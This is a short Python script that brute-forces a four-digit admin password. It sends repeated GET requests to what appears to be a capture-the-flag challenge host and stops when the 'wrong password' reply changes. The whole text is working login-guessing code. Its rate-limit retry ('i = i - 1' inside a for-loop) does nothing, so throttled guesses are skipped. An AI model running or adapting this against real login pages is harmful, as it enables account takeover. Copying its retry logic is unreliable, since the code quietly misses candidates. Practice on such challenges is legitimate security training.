import time
import requests

url = "http://561ec032-db3f-4e90-bc19-8f7d4d1ae25b.node4.buuoj.cn:81/?username=admin&password="

for i in range(6400, 7000):
    res = requests.get(url + str(i))
    print("[*] Try :" + str(i))
    if res.status_code == 429:
        time.sleep(0.5)
        i = i - 1
        continue
    if res.text != "密码错误，为四位数字。":
        print(res.text)
        break
